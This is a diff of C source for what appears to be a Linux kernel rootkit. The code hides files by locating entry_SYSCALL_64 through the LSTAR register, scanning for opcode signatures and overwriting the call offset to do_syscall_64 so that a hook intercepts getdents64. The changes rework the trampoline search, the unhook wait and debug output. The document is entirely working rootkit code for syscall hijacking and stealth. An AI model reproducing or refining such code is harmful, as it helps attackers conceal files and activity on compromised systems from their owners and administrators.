@@ -73,8 +73,9 @@ unhide_files_lstar(void)
     disable_protection();
     memcpy((syscall_64_ptr + 1), &oldOff, 4);
     enable_protection();
-    while (atomic_read(&syscall64_count) > 0)
-        msleep(250);
+    
+    if ((atomic_read(&syscall64_count)) > 0)
+        msleep(10000);
 }
 
 //Only use with multiples of 16..
@@ -118,27 +119,21 @@ find_do_syscall_64(char *lstar_addr)
 {
     //Step 1: get address of stage 2 trampoline
     //If lstar_addr points to entry_SYSCALL_64 directly, skip this part (the case on rkcheck VM)
-    unsigned long stage2_addr;
+    unsigned long next_addr;
 
-    //Not good, more of a hotfix: check if swapgs is first instruction; if so, we are at entry_SYSCALL_64
-    if(!memcmp(lstar_addr, "\x0f\x01\xf8", 3)) {
-        stage2_addr = (unsigned long)lstar_addr;
-    } else {
-        char *stage2_ptr = strnstr(lstar_addr, movSignExtended, SEARCHLEN);
+    char *stage2_ptr = strnstr(lstar_addr, movSignExtended, SEARCHLEN);
 
-        if(!stage2_ptr)
-            return NULL;
-
-        stage2_addr = mem_offset(stage2_ptr + 3); //3 bytes offset to skip opcode
-    }
+    if(!stage2_ptr)
+        //we are probably at entry_SYSCALL_64
+        next_addr = (unsigned long)lstar_addr;
+    else
+        next_addr = mem_offset(stage2_ptr + 3); //3 bytes offset to skip opcode
 
     //Step 2: conveniently, no 'pointer' chasing is necessary, we can just look for the jump opcode from here
-    char *syscall64_call_ptr = strnstr((char *)stage2_addr, callNearRelative, SEARCHLEN);
+    char *syscall64_call_ptr = strnstr((char *)next_addr, callNearRelative, SEARCHLEN);
 
     if(!syscall64_call_ptr)
         return NULL;
-
-    hexdump(syscall64_call_ptr, 16);
 
     //Get offset from memory
     unsigned long syscall64_off = oldOff = mem_offset(syscall64_call_ptr + 1); //1 byte offset to skip call opcode
@@ -172,9 +167,7 @@ g7_syscall_64(unsigned long nr, struct pt_regs *pt_regs)
     atomic_inc(&syscall64_count);
     do_syscall_64(nr, pt_regs);
 
-
     if (nr == __NR_getdents64) {
-        DEBUG_INFO("We are here!\n");
         //  
         //  ( ͡°Ĺ̯ ͡° )
         //
